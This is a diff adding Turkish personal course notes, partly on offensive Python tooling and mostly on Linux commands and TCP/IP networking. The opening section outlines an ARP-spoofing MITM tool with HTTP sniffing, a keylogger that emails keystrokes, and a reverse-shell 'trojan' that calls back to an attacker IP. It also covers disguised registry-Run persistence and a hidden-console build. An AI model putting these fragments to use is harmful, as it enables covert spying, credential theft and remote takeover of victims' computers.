+			istek_paket=scapy.ARP(pdst="10.0.2.1/24") : Arp paketlerini oluşturur. pdst kısmına IP aralığını veririz. Bunu inputlardan da alabiliriz
+			#scapy.ls(scapy.ARP()) : fonksiyonun inputları hakkında bilgi verir
+			yayin_paket = scapy.Ether() : Modem üzerinden yayın yapacak fonksiyondur. scapy.ls ile inputlarının detayına bakabiliriz. dst parametresine default mac veririz "ff:ff"
+			paket= yayin_paket/istek_paket: scapy üzerinden paketleri birleştirir
+			a = scapy.srp(paket,timeout=1) : paketlerin gönderim işlemini yapar timeout parametresi ile taramalar arasında beklemeyi belirleriz
+			#print(a) :  Bu değişkene atadığımız kısım paketlerden gelen bilgileri bize gösterir(Kaç dolu kaç boş etc.etc) bunları da bize tuple olarak verir
+			(olumluPaket,olumsuzPaket) = scapy.srp(paket,timeout=1) : Gelen verileri açmak için 2 değere atarız
+			olumluPaket.summary() : Listeleme işlemini yapar
+
+			-Sonrasında optparse ile düzenleme yapıp tool olarak kullanmaya başlayabiliriz
+
+58- Ortadaki Adam saldırısı Tool Yazımı :
+
+		- import os > import scapy.all as scapy
+		- os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") : MITM saldırısı yaparken internet erişimini karşıya da vermek için yazdığımız koddur
+		- arp_cevap = scapy.ARP(op=2,pdst="ipAdres/aralığı",hwdst="targetmacAdresi",psrc="kendimiziGöstereceğimizIP(10.0.2.1)") : Arp paketi oluşturuyoruz . op parametresine 1 değeri verirsek istek 2 değerini verirsek cevap olarak ayarlarız. pdst parametresine ip veririz
+		- scapy.send(arp_cevap,count=İnt) : paketi göndermeye yarar, count paketin kaç defa atılacağını söyler
+		- Bunun aynısını modem için de yapmamız gerekmektedir
+		- kullanıcıdan Mac adresi istememek için ağ ip adresi üzeirnden mac adresi bulup arp paketine kendimiz kodda dahil ederiz (yukarıdaki ağ tarayıcıda method var). Sadece Mac adresine ulaşmak için listeyi teker teker açarız. En sonda ise .hwsrc ile maci seçer ve döndürürüz
+		- iki fonksiyonu birleştirip inputları otomatik olarak verdiğimizde (mac için) işlemi
+		- Saldırıyı tamamen yapmak için arpcevap("10.0.2.11","10.0.2.1") ve aprcevap("10.0.2.1","10.0.2.11") olarak parketi yollarız. Bu hem modemi hem de target cihazı manipüle eder
+		- sürekli paket göndermek için bunu döngüye alırız while True: arpcevap(), arpcevap() time.sleep(1) diyerek işlemciyi de yormayız
+		- Paket bilgilerini göstermemek için scapy.send(arp_cevap,verbose=false) deriz
+		- Kaç paket attığımızı görmek için while dışında sayac oluşturup gösteririrz
+		- KeyboardInterrupTın görünmemesi için while döngüsünü try except ile kontrol ederiz
+		
+		Temizleme işlemi :
+
+		-Mac adresinin değişmesi için modeme ters saldırı yapıp işlerin düzelmesini sağlarız
+		 Modemin ıp ve mac adresini cihaza cihazın ip ve mac adresini modeme göndeririz
+
+
+
+		Verileri Okuma :
+
+			Manuel : Wireshark programı ile okunabilir
+			- wiresharktan bağlı olduğumuz interface'i açıp inceleme yapabiliriz
+			
+
+			Otomatik : pip3 install scapy_http
+			
+			- Elimizdeki MITM toolu üzerinden gidiliyor
+			- Yeni py dosyası açtık
+			- import scapy.all as scapy && from scapy.http import http
+			- def veri_toplama(interface) : scapy.sniff(iface=interface,store=False,prn=veri_analiz)
+			- def veri_analiz(paket): if paket.haslayer(http.HTTPRequest) : if paket.haslayer(scapy.Raw): print(paket[scapy.Raw].load) : Filtreleme bu şekilde olur
+		
+			Not: smtplib kütüphanesi ile mail gönderme işlemini halledebilirsin
+
+59- Keylogger :
+
+		- pip3 install pynput
+		- import pynput.keyboard
+		- def emir(harfler): toplama="" -> toplama+=harfler Bu tür fonksiyon içinde bunları stringe veya listeye atayıp gösterimini sağlarız : Bu programdaki mantık listener'a bir fonksiyon verip bu dinlediği şeyleri ne yapacağını söylemek oluyor
+		- dinleme = pynput.keyboard.listener(on_press=emir)
+		- with dinleme : dinleme.join() -> Programın düzgün çalışması için with ile açılması gerekir
+		- Mail gönderme işlemini threading.Timer fonksiyonu ile ayrı olarak çalıştırırız. Mail gönderme işlemini de kendi kendine mail atan boş bir hesap ile hallederiz
+
+60- Trojan : 
+		
+		- import socket : Bağlantı açmaya yarayan işler için kullanılır
+		- baglanti = socket.socket(socket.AF_INET/6,socket.SOCK_STREAM) : AF_INET ile IPv4 adresleri belirtiriz. socket.SOCK_STREAM ise TCP bağlantısını temsil eder, UDP için SOCK_DGRAM yazarız
+		- baglanti.connect(("10.0.2.*",888)) : Bağlantı kurulması için kendi IP'mizi ve bağlantı portunu açarız
+		- baglanti.send("mesaj\n",encode("utf-8") ) : bağlantı kurulduğunda bize mesaj gönderir
+		- netcat ile dinleme yaparız "nc -l -p 888" : Bağlantı kurulur
+		- kendi bilgisayarımızdan komut göndermek için subprocess kütüphanesi ile input alırız kendimizden
+		- import subprocess
+		- while True: komut = baglanti.recv(1024).decode("utf-8") : kendi bilgisayarımızdan komut göndeririz. İçine byte yazarız klasik olarak 1024 kullanılır. İnput şifreli olduğu için decode ederiz
+		- def komut_isleme(komut): return subprocess.check_output(komut,shell=True)
+		- veri = komut_isleme(komut)
+		- baglanti.send(veri) : while True burada biter
+		- baglanti.close() 
+
+	Trojan kontrol edici : Trojanın ne zaman ne yapacağını söyler
+			       Kalide yazıyoruz
+		- import socket
+		- baglanti = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+		- baglanti.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) : Bağlantıyı sürekli tazeler
+		- baglanti.bind("10.0.2.*",888) :
+		- baglanti.listen() : dinlemeye başlar
+		- (baglan,adres) = baglanti.accept() : Bağlantıyı kabul eder
+		- while True: giris = input("komut giriniz") : bağlantı  sağlanınca komut alır
+		- baglan.sendall(giris.encode("utf-8"))
+		- gelenVeri=baglan.recv(1024).decode("utf-8") : baglanti yerine baglan kullanmamızın sebebi kabul edilen bağlantının accept fonksiyonundan gelmesidir
+		- print(gelenVeri) while True bitiş
+
+
+
+	simplejson ile Paketleme :
+
+		-import simplejson
+		- def paketleme(self,veri): paket=simplejson.dumps(veri)
+		- self.baglan.sendall(paket.encode("utf-8")) : sendall diğer kısımdan silinir. Yerine self.paketleme(giris) deriz
+		- def paket_coz(self): gelen_veri=self.baglan.recv(1024).decode("utf-8") -> return simplejson.loads(gelen_veri) : gelen veri kısmı silinir ve yerine cikti= self.paket_coz -> print(cikti) deriz
+		- aynı kodları trojan'a ve trojan dinleyiciye eklememiz gerekir koordine çalışmaları için
+
+	Trojanin sürekli çalışması :
+
+		-regedit - HKEY_CURRENT_USER - Microsoft - Windows - Currrent Verison - Run üzerinden eklenir
+		- Komut satırında reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsEklenti /r REG_SZ /d trojanYolu/system.exe
+		- Bunları kodda eklerken yapılacaklar :
+			import shutil
+			import sys
+		
+			dosya_uzantısı = os.environ["appdata"]+"\\system.exe"
+			if not os.path.exists(dosya_uzantisi) :
+				shutil.copyfile(sys.executable,dosya_uzantisi)
+				kayit = "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v windowsEklenti /r REG_SZ /d" + dosya_uzantisi
+				subproces.call(kayit,shell=True)
+		- Programı exe'ye dönüştürmek için
+			pip install pyinstaller
+			pyinstaller name.py --onefile --noconsole --icon "uzantı "-add-data "uzantı": kodun terminalini kapatır
+		
+		- Terminali kapatmak için
+
+		Not: subprocess'e eklenecek parametreler : subprocess.check_outout(komut, shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
+
+
+		Not: Bütün cihazların default Mac adresi ff:ff:ff:ff:ff:ff
+				
+
+
+
+
+
+
+
+
+-----------------------------------Zafiyetler--------------------------------------------
+
+
+
+
+
+-------------------------------------Turkcell Linux-----------------------------------
+
+
+1- ls -a : Gizli dizin ve dosyaları da gösterir
+   ls -l : Dizinlerin izinlerini ve en son ne zaman değiştiğini gösterir. Daha detaylı bilgi sunar
+	
+
+
+
+2- /bin : temel kullanıcı komutlarını içerir
+   /boot : Açılıştaki statik dosyalar
+   /dev : Cihaz dosyaları
+   /etc : Sisteme özel ayarlar
+   /home : Kullanıcı ana dizini
+   /lib : Temel kütüphaneler ve çekirdek modülleri
+   /media : Çıkarılabilir ortam dosyaları
+   /mnt : Yerleştirilen dosya ortam dosyaları (HArici disk vs)
+   /srv : Servis dosyaları
+   /tmp : geçici dosyalar
+   /var : Çeşitli dosyalar içerir(log vs)
+   /root : Root kullanıcısı ana dizini
+
+3- cd - : En son bulunan dizine geçer
+   rm -r dizin : Dizin silmeye yarar
+   tar -zcvf isim.tar dosya1,dosya2.. : Dosya ve dizinleri sıkıştırır
+   tar -zxvf isim.tar : Tar dosyalarını açar
+   cat -n dosya : dosyaların satır numaralarını gösterir
+   cat dosya1 dosya2 : 2 dosyayı aynı anda gösterir
+   cat -E dosya : Satır sonlarını dolar işareti ile belli eder
+   tac dosya : dosyayı tersten okumaya başlar
+   head dosya : dosyanın ilk 10 satırını okur
+   head -nsayi dosya : Dosyanın sayı kadar satırını okur
+   tail dosya : dosyanın son 10 satırını okur
+   tail -nsayi dosya : Dosyanın sayı kadar satırını sonran okur
+   tail -f dosya : dosyayı canlı olarak izler değişimler direkt terminalde görünür
+   more dosya : Ekrana sığmayan dosyaları okumamızı sağlar
+   nl dosya : boş olmayan satırlara satır numarası ekler
+   file dosya : Dosyanın türünü gösterir
+   wc dosya.txt : Satır sayısı , Kelime sayısı , Boyut , İsim bilgilerini verir
+   wc -L dosya : En uzun satırın kelime sayısını gösterir
+   sort dosya : Dosyadaki verileri sıralar
+   sort -k 2 dosya : 2. sütuna göre sıralar. Sütunlar boşluğa göre ayrılır
+   sort -c dosya : Dosyanın sıralı olup olmadığını kontrol eder. Sırayı bozan satırı söyler
+   sort -r dosya: Dosyayı tersten sıralar
+   sort dosya -o yeniDosya : Sıralı hali yeni dosyaya kaydeder
+   sort -R dosya : dosyayı shuffle edip verileri karıştırır
+   grep "kelime" dosya.txt : kelimenin bulunduğu tüm satırları gösterir
+   grep -v "kelime" dosya.txt: Kelimenin içinde bulunmadığı tüm satırları verir
+   grep -i "kelime" dosya.txt : Büyük küçük harf duyarlılığını kaldırır
+   grep -i "kelime" dosya1 dosya2 dosy3 : Çoklu dosyalardan arama yapar
+   grep "kelime" -l dosya1 dosya2 dosya3 : Verileri listelemez sadece kelimenin bulunduğu dosya isimlerini verir
+   grep "kelime" -c dosya : Kelimenin kaç kere geçtiğini sayar
+
+4- Wildcard : Komutları yazarken kriter oluşturmamızı sağlar, filtreleme işlevi görür , zaman kazandırır
+
+ 	1- * : bir veya birden fazla karakterin yerine geçebilecek bir joker karakterdir.
+
+		Kullanım : ls *.html : Html uzantılı bütün dosyaları listeler
+			   ls *.txt : Sadece txt uzantılı dosyaları getirir
+			   ls 10*-fizik* : İki yere de değişken gelebilir
+		   	   ls *fizik* : İçinde fizik geçen bütün dosyaları listeler
+	2- ? : Yalnızca bir karakterin yerine geçebilecek bir joker karakteridir
+			
+		Kullanım : * ile kullanımı aynıdır. ? sadece 1 karakterin yerini alırken * birden fazla karakteri alır
+
+	3- [] : Yerine geçeceği karakterleri küme şeklinde belirten bir wildcard operatörüdür
+
+		Kullanım : ls 1[12]*txt : 1 ile başlayan devamında 1 veya 2 alan txt uzanlatılı bütün dosyaları çağırır
+
+5- Yönlendirme operatörleri : 
+
+
+	1- > : Bir programın komutun çıktısını başka bir dosyaya yazmamızı sağlar
+	
+			Kullanım : cat dosya.txt > yeniDosya : Dosyanın içeriğini tamamen alıp yeni dosyaya atar. Eğer o dosya hali hazırda varsa içeriğini silip üstüne yazar
+				   date > tarih.txt
+
+	2- >> : Komutların çıktısını bir dosyanın sonuna ekler. >'dan farkı üstüne yazmaz ekleme yapar
+
+			Kullanım : cat dosya.txt >> yeniDosya
+
+	3- | : Komutların çıktısını başka bir programa girdi olarak vermek için kullanılır
+
+			Kullanım : ls -l | grep fizik : ls -l sorgusunun cevabını grep'e input olarak vererek aramayı orada yapar
+				   cat dosya.txt | sort : Çıktıyı sıralar ve bu zincir uzatılabilir 	
+
+
+
+
+	4- alias : Alias komutu uzun uzun komutlar yazmak yerine bunları bir değişkene atayıp kullanmayı sağlar.
+
+	
+			Tanımlı alias'ları listelemek : alias komutu bize tanımlı olan aliasları listeler
+
+			Kullanım : alias guncelle = 'apt-get upgrade' : HEr guncelleme yazdığımızda apt-get upgrade'i çalıştırır
+
+			Tanımlı alias'ı silmek : unalias guncelle : bu tanımlı guncelle alias'ını kaldırır
+
+			Kalıcı yapmak :  tilda/.bashrc : dosyasına tanımlar yapılıp eklenemelidir
+
+
+6- Kullanıcı işlemleri :
+
+	
+
+	Grup Nedir : Grup birden fazla kullanıcının altında bulunduğu ve gruba özel izinlerden faydalanan kullanıcı topluluğudur
+			
+			Bir kullanıcı birden fazla gruba üye olabilir
+		
+			Grup üyelikleri /etc/group altına tanımlanır
+
+
+	Kullanıcıları Listeleme : 
+
+			1- /etc/passwd dosyasında bütün kullanıcıların şifreleri ve bilgileri vardır 
+		    	2- ilk sütun kullanıcının ismini 3. sütun kullanıcı ID'sini 4. sütun (grup)GID'sini 5. sütunda kullanıcının tam isimi vardır. Sonraki sütunda kullanıcının home dizini bulunur. son sütunda ise kullanıcnın kabuk erişimi bulunuyor
+			3- /etc/shadow dosyasında kullanıcıların şifreleri vardır. Sadece root bu dosyayı okuyabilir
+			4- ls -al shadow ile dosyanın izinlerine bakarız
+			
+
+	Kullanıcı Ekleme Silme :
+
+			1- useradd kullanıcıAdı : Kullanıcıyı oluşturur
+			2- passwd kullanıcıAdı : Kullanıcıya şifre atar
+			3- adduser kullanıcıAdı : Kullanıcı oluşturur ve şifresini direkt olarak atar. tam isim ve diğer bilgileri ister
+			4- deluser kullanıcıAdı : Kullanıcıyı siler
+			5- userdel kullanıcıAdı : Kullanıcıyı siler
+			
+
+	Grup Listeleme Ekleme Silme :
+
+			1- cat /etc/group : sistemde tanımlı olan grupları ve üyelerini verir
+			2- addgroup grupAdı : Grup oluşturulur
+			3- delgroup grupAdı : Grubu siler
+			4- usermod -a -G grupAdı kullanıcıAdı : bir kullanıcıyı gruba ekler
+			
+
+
+
+7- Sahiplik ve Yetki işlemleri :
+
+		
+		1- dosyaları detaylı listelediğimizde görülen 3 sğtundan oluşan izinlerin ilk sütunu kullanıcının, ikinci sütun grubun, üçüncü sütun ise public izinlerini temsil eder
+
+	Dosya ve Dizinlerde sahiplik görüntülüme,değiştirme :
+
+		1- ls -al veya ll : bu komutlar dosyaların sahiplerini gruplarını ve izinlerini gösterir
+		2- chown yeniKullanıcı dosya/dizin : Bir dosya veya dizinin sahibini değiştirir
+		3- chgrp yeniGrup dosya/dizin : bir dosya veya dizinin grubunu değiştirir
+		4- chown/chgrp yeniSahip dosya1 dosya2 dosya3 : Birden fazla dosyanın sahipliğini ve grubunu değiştirir		
+			Not: Default olarak chown komutu bir dizinin sahipliğini değiştirse bile dizinin altındaki dosyaların sahipliğini değiştirmez.
+			     Bunu düzeltmek için chown -R yeniKullanıcı dizin şeklinde bir kullanım yapılmalıdır. Aynısı gruplar için de geçerlidir
+			     chown -R yeniKullanıcı:yeniGrup * : bütün dosya ve dizinlerdeki izinleri değiştirir
+
+
+	Dosya izinleri işlemleri :
+
+		1- Listelemek için ls -al veya ll komutu kullanılır. dosyanın ilk karakterleri dosyanın türünü(- = normal dosya, d = dizin, l = bağlantı) belirtirken sonraki 9 karakter izinleri ifade eder (3- owner, 3- group, 3-public)
+		   r=4,w=2,x=1 sayısal ifadelerini temsil ederler. bir dosyanın izinini hesaplamak için ilk 3 izin değeri toplanır,sonra orta3 ve en son son 3 ifade toplanıp 3 basamaklı bir sayı olarak bir araya getirilir örneğin 664 
+
+		2- chmod +w dosyaIsmi : Dosyanın kullanıcı  ve grubuna yazma ismi ekler. 
+		   
+		3- chmod -x dosyaIsmı : Dosyanın çalıştırma yetkisini kaldırır. Herkesin iznini kaldırır(owner grup ve public için)
+	
+		4- chmod 640 dosyaIsmı : İzinleri sayısal olarak belirtip işleme sokabiliriz. Bu örnek (own=rw,grp=r,public=0) olarak kullanılarak hesaplanmıştır
+
+		5- chmod -R izinDeğeri dizin : bir dizin altındaki bütün dosyaların izinlerini değiştirir
+
+
+
+
+
+
+
+8- Process İşlemleri : 
+
+	Processler 3 kısma ayrılır : Process ID , User ID , Parent Process ID.
+	Process ID'ler işlemlerin numarasını, User ID'ler bu processin tanımlı olduğu kullanıcıyı. Parent ise bu process bir alt process ise üst processini gösterir
+	
+
+	Process İşlemleri :
+
+		1- ps -ef komutu ile sistemdeki tüm processleri listeleriz
+		2- ps -auKullanıcı : Sadece kullanıcının çalıştırdığı processleri listeler
+
+	Süreçlerin Canlı Takibi ve Sonlandırılması :
+
+		1- ps -aux : Daha detaylı veri verir
+		2- apt install htop uygulaması indirilir
+		3- htop komutu ile canlı şekilde processleri görürüz. Detaylı inceleyebilir ve killeyebiliriz
+		4- kill PID komutu ile processi öldürebiliriz
+		5- Normal kullanıcılar yönetici tarafından çalıştırılan uygulamaları kapatamaz
+		6- kill -9 PID : Aniden programı kapatır 9 numaralı sinyali gönderir. kill -l ile listeleyebiliriz
+			-15 sinyali daha yumuşak kapatır
+		7- pkill kelime : Processlerinde kelime geçen tüm processleri kapatır
+		8- htoptan f9 ile killenebilir
+
+	Arkaplanda Süreç Yönetimi :
+
+		1- Bazı uygulamaların terminale bağlanması durumu sıkıntılıdır
+		2- uygulama & komutu ile uygulama arkaplanda çalışır ama yine de terminale bağlıdır
+		3- nohup uygulama & : Terminalle olan bağlantıyı tamamen koparır
+		
+		4- uygulama çalışırken ctrl+z yapılırsa terminalle bağlantı tam kopmasa da terminalden komut yapılabilir
+		5- bg ile arkaplandaki processleri görürürüz
+		6- disown -h %id komutu ile terminalle olan ilişki koparılır		
+
+	Servisler: Linuxta arka planda, gerektiğinde kullanılmak için sürekli çalışan uygulamalara servis denir
+	
+		1- Sistem tarafından başlatılır
+		2- Root yetkileri ile yönetilebilir, eklenebilir, silinebilir
+		3- systemctl list-units --type service --state running : Systemdeki yüklü servisleri listeler. State running sadece canlı olarak çalışanları listeler
+		4- systemctl status serviceName : Servis hakkında bilgi verir
+		
+		5- systemctl stop serviceAdı : Servisi sonlandırır
+		6- systemctl start serviceAdı : Servisi başlatır
+		7- systemctl restart serviceAdı : Servisi resetler
+
+9- Ağ İşlemleri :
+
+	
+		Not: ifconfig olmayan bilgisayarda ip addr show komutu ile görünür
+		
+		1- hostname -I ile sadece IP adresi döndürülebilir
+		2- Paket incelemeleri için tcpdump kullanılır. tcpdump -v ile çalıştırılır
+		3- iftop komutu ile yine ağ ve paket incelemesi yapılabilir
+
+
+		SSH ile bağlanmak : 
+
+			1- kablolu bağlantı varsa kapatılır. Köprü bağdaştırıcı seçilir
+			2- apt install ssh 
+			3- systemctl enable ssh
+			4- ssh kullanıcıAdı@IPadresi komutu ile karşıdaki bilgisayara bağlanılabilir
+			5- systemctl disable ssh ile kalıcı olarak kapatılır
+
+		Not: nslookup url komutu ile dns sorguları yapabiliriz. reverse dns sorgusu da yapılabilir
+
+
+10- apt Paket Yöneticisi : 
+
+		1- apt paket yönetim sistemi bilgisayara bir paketi kolaylıkla kurmamızı, kaldırmamızı ve yapılandırmamızı sağlayan sistemdir
+			
+		2- apt-get update paketlerin listesini günceller. Bu paketler /etc/apt/sources.list dosyasında tutulur
+		
+		3- apt-get install istediğimiz paketi yüklememizi sağlar
+
+		4- apt remove istediğimiz bir paketi kaldırır
+
+		5- apt upgrade bilgisayardaki paketleri günceller
+
+		6- apt search kelime : kelimeye göre indirilebilecek dosyaları arar
+
+		7- apt list --upgradeble güncellenebilir uygulamaları listeler
+	
+		8- apt autoremove : bir program silindiğinde ona bağlı olarak yüklenen paketler sonradan işlevsiz olacağı için silmeye yarar
+
+		9- apt purge komutu ise konfigürasyon dosyalarını da paketle beraber siler
+
+		10- dpkg -i dosya : paketin kurulumunu yapar
+	
+		11- dpkg -l : dosyaları listeler
+		
+		12- dpkg -r dosya : dosyayı siler
+
+10-Shell programlama :
+
+
+		1- sh ve bash genellikle kullanılan shell programlama dilleridir
+		
+		2- echo "string" : ekrana yazdırır. print() gibi
+
+		3- ilk satırda #!/bin/sh koyulur dilin belli olması için
+
+		4- touch dosya ismi : dosya oluşturur
+		
+		5- echo "string" >> touchileaçılanDosya : Bu komutla dosyalara yazma işlemi de yapılabilir
+			
+		6- chmod +x dosya ile yetki verilir ./dosya ile çalıştırılır
+
+		7- echo "isminizi yazın: " --> read isim --> echo "merhaba $isim " : İnput alıp değişkene atayıp ekrana bastırma işlemi 
+
+		8- # yorum satırı işaretidir
+
+		9- ((toplam=100+67)) --> echo $toplam : Değişken atayıp ekrana bastırır
+
+		10- echo "şifrenizi girin : " --> read parola --> if [[ ($parola =="abcd") ]]; then --> echo "parola doğru" --> else --> echo "parola yanlış" --> fi : (if kısmını kapatır)
+
+		11-a=1 --> while [ $giris(true)] --> do--> echo $a -->if [ $a -eq 10 ]; then --> break --> fi --> ((sayac++)) --> done : Bir sayaç alıp arttırıp döngüye sokar ve koşula bağlı olarak döngüyü durdurur
+
+		12- sleep int,float : kodu dururur, uyutur
+
+		13- echo "merhaba" --> date --> echo --> cal --> echo "görüşmek üzere" : tarihi gösterir
+
+		14- bir bash dosyasında başka bir bash dosyasını çağırmak için "bash /dosyaYolu.sh" komutu kullanılır
+		
+	
+
+
+
+
+
+------------------------------------Turkcell Network-----------------------------------------------------------
+
+TCP/IP Layer :
+
+	
+	1- Uygulama : Bu katmanda veriyi göndermek isteyen uygulama ve kullandığı dosya formatı bulunur. Örneğin "HTTP üzerinden HTML formatında yazılmış Turkcell ana sayfası". 
+			OSI modelindeki gibi ağa erişmek için gerekli uygulama protokollerini içerir. OSI modelindeki uygulama katmanından farkı sunum ve oturum katmanlarının uygulama katmanı içerisinde yer almasıdır. 
+			SMTP ve FTP protokolleri bu katmanda bulunur.
+
+
+	2- Taşıma : Bu katmanda verinin ne şekilde gönderildiği gösterilir. 
+		    Servis kalitesi (the quality of service), güvenli (reliable) veri aktarımı, veri akış kontrolü (flow control), hata kontrolü (error control) gibi işlemlerin yapıldığı katmandır. 
+		    TCP veya UDP gibi protokoller bu katmandadır. TCP, bağlantı tabanlı (connection oriented) ve güvenilir (reliable) iletişim sağlayan bir protokoldür. 
+		    Bağlantı tabanlı olması kaynak ve hedef arasında mantıksal bağlantı kurulması anlamına gelmektedir. Bu da iki bilgisayarın veri alışverişinde bulunmadan önce anlaşması demektir. 
+		    Güvenilir olması; kurulan bağlantı üzerinden gönderilen verinin gönderildiği şekilde, veri kaybı olmadan ve sıralı biçimde iletimini garanti eder. 
+		    UDP bağlantısız (connectionless) ve güvenilir olmayan bir iletişim sağlar. UDP'de ek bağlantı kontrolleri olmadığından dolayı UDP başlığı (header) TCP'nin başlığına göre daha kısadır. 
+		    Bu nedenle UDP, TCP'ye göre daha hızlıdır.
+
+	3- Internet(Network/IP) Layer : Bazen IP katmanı olarak da anılan bu katman, IP adreslerinin veriye eklendiği ve yönlendirmenin yapıldığı katmandır. Paketin hedefe en iyi yoldan gönderilmesi de bu katmanın sorumluluğudur. 
+					Bu katmandaki uygulamalar IP veya IPv6 gibi iletişim protokolleri olabileceği gibi ICMP veya IGMP gibi durum bildirme ve katmanlar arası bağ protokolleri de olabilir. Bu katmanda Router kullanılır.
+
+
+	4- Network Interface (Data Link Layer) :  Data link katmanı, verinin fiziksel aktarımını sağlar. Aynı zamanda hata bildirme, ağ topolojisi ve akış kontrolünü ele alır. 
+						  Yani Data Link katmanı, donanım adresi kullanan bir LAN’daki belirli bir cihaza mesajların taşınmasından emin olacaktır ve aktarılması için Network katmanından gelen mesajları, Physical katman için bit’lere dönüştürecektir. 
+						  Bu katmanda switchler kullanılır ve haberleşme Donanım Adresi (MAC) ile yapılır.
+
+	5- Physical Layer : Fiziksel katman, veri bitlerinin alıcıya nasıl iletileceğinin belirlendiği katmandır.
+			    Bir ve sıfırların nasıl elektrik, ışık veya radyo sinyallerine çevrileceğini ve aktarılacağını tanımlar. HUB bu katmanda bulunur.
+
+
+
+2- IP :
+
+	5 class IP adresi mevcuttur.
+
+	Class A: 0.0.0.0  - 127.255.255.255 arasındaki ip adresleri.
+
+	Class B: 128.0.0.0  - 191.255.255.255 arasındaki ip adresleri.
+
+	Class C: 192.0.0.0 - 223. 255.255.255 arasındaki ip adresleri.
+
+	Class D: 224.0.0.0 - 239. 255.255.255 arasındaki ip adresleri. (özel kullanım için ayrılmıştır.)
+
+	Class E :240.0.0.0 - 255. 255.255.255 arasındaki ip adresleri. (bilimsel araştırmalara için ayrılmıştır, internet ortamında kullanılmazlar.)
+
+	Bu classların içinde özelleşmiş IP blockları mevcuttur.
+
+	Private IP adres;
+
+	Bu adresler internete bağlı olmayan makinelerde ya da internet bağlantısını proxy server veya NAT aracılığıyla sağlayan iç networkte bulunan makinelerde kullanılabilir. 
+	Yani bu adresler internete direk bağlı makinelerde kullanılamaz. A,B ve C classlarında bulunurlar. Özel IP adres aralıkları aşağıda gösterilmiştir;
+
+	10.0.0.0 - 10.255.255.255
+	172.16.0.0 - 172.31.255.255
+	192.168.0.0 - 192.168.255.255
+
+	Loopback IP adres:
+
+	127.0.0.1 ile 127.255.255.255 aralığında bulunan IP adreslerdir. 127.0.0.1 adresi yerel hostu tanımlayan Loopback adrestir. Bu adres her bilgisayarın kendisini ifade eder. 
+	TCP/IP adresinin düzgün çalışıp çalışmadığını kontrol etmek amacıyla kullanılır. Mesela bu adres bilgisayarınızda bir web servisi çalıştırıyorsanız ve çalışırlığından emin olmak istiyorsanız browser'a http://127.0.0.1 yazarak onu kontrol edebilmenizi sağlar.
+
+	Link-Local addres:
+
+	169.254.0.0 – 169.254.255.255 adres aralığıdır, bunu genelde DHCP üzerinden ani otomatik bir IP atayan cihazdan IP adresi alamadığımız zaman bilgisayara atanmış IP adresi olarak görürüz.
+
+	Multicast-IP addres:
+
+	224.0.0.0 – 239.255.255.255 aralığında bulunur. Grup adresleri kullanılarak, birden fazla cihazın tekil bir adresi dinlemesi (buradan veri beklemesi) sağlanmaktadır.
+
+	PUBLIC IP ADRESİ:
+
+	Yukarıdaki özel IP'ler dışında kullanılan bloklardır, internet ortamında kullanılır. Girdiğimiz çoğu siteye, internetten ulaştığımız her yere bu IP adresleri sayesinde ulaşırız. 
+        Bu IP adresleri uniq (tek kullanımlık) olarak kullanılmaktadır. Dünya üzerinde bir public IP kullanılıyorsa biri tarafından başka yerde kullanılamaz. Bu Ip adreslerinin dağıtım ve kontrol görevi RIR (Regional Internet Registrie) tarafında sağlanır.
+	5 tane RIR mevcuttur. Bizim içimizde bulunduğumuz RIR, RIPE'dir, bir şirket kendine ait public bir IP aralığı almak istiyorsa RIPE'la iletişime geçmek zorundadır.
+
+
+
+2- Subnet Mask :
+
+		Ağ maskesi IP adresinin maske kısmını oluşturur. Böylece TCP/IP, Network adresi ile Host adresini birbirinden ayırır. Ağ maskesi ağ sınıfına göre düzenlenir. Ağ maskesi kullanılarak ağdaki iki bilgisayarın veya cihazın aynı ağda olduklarını anlamalarını sağlar. Bir bilgisayar, IP adresinin hangi bölümünün ağı tanımladığını, hangi bölümünün ise bilgisayarı tanımladığını bilmek zorundadır. Bunun için alt ağ maskesi bilgisini kullanır. Bir IP adresine ait network bilgisini bulmak için subnet-mask ile birlikte mantıksal olarak AND'lenir.
+
+		Mesela, 123.34.0.1 adresinin ağ maskesi 255.255.0.0 ise, ilgili IP adresin ağ kısmı ve sistem adresi aşağıdaki gibi hesaplanır;
+
+
+
+		İki PC'miz arasında haberleştirme istiyoruz.
+
+		123.34.23.23 subnet 255.255.0.0 
+		123.34.200.89 subnet 255.255.0.0
+
+		Subnetleri ile AND yaparsak 123.34.0.0 verdiğini görebilirsiniz. Yani bu iki IP birbiri ile haberleşecekler.
+
+		Classlara göre subnet aşağıdaki şekilde görebilirsiniz.
+
+
+
+		Buradaki “1” ler network'ü temsil ederken “0”lar clientları temsil eder. Yani A class bir network de 0 sayısı ile orantılı B classtan daha fazla client haberleştirilebilir. Bir networkte haberleşecek client sayısını da 2n  olarak hesaplarız. (n = host biti yani “0''ların sayısı.")
+
+
+
+		Burada host sayıları bu şekilde iken clientlara verilecek IP sayısı formülü 2n-2 dir. Network IPleri ve broadcast IPleri PC'lere verilemez.
+
+		Yani A class bir network için IP alabilecek client sayısı 16777214'tür.
+
+		Ağ maskeleri IP ile birlikte gösterileceği zaman 1 sayıları yanlarına / işareti ile eklenir.
+
+		Mesela C class bir IP yi gösterirken;
+
+		192.168.1.0 255.255.255.0 burada subnet mask 24 tane 1, 8 tane 0'dan oluşuyor, önceki tabloda görmüştük. Bunun gösterimi 192.168.1.0/24 şeklinde olmaktadır. Bundan sonra uzun gösterimlerden çok bu şekilde bir gösterim yapacağız. Buna CIDR gösterimi denir.
+
+ 
+
+
+	Classles IP adress : Şimdiye kadarki bütün çalışmalarımızı classfull yaptık. Bu şu anlama gelmektedir; bir IP’de çalışacağımız zaman onun class’i neyse subnet maskını da ona göre belirledik. Classless adreslerde ise subnet mask sınıftan bağımsızdır. Şöyle ki 10.x.x.x gibi bir ip adresine istendiğinde 255.255.255.0 gibi bir subnet mask verilebilir ve Classless olan sistemlerde bunu algılarlar.
+
+				Şimdi daha somut örneklerle alt ağlara bölme alıştırmalarına devam edelim. Network için en önemli konu IP’dir ve bunları bölmek ve yönetmek, istenilen özelliklerdir.
+
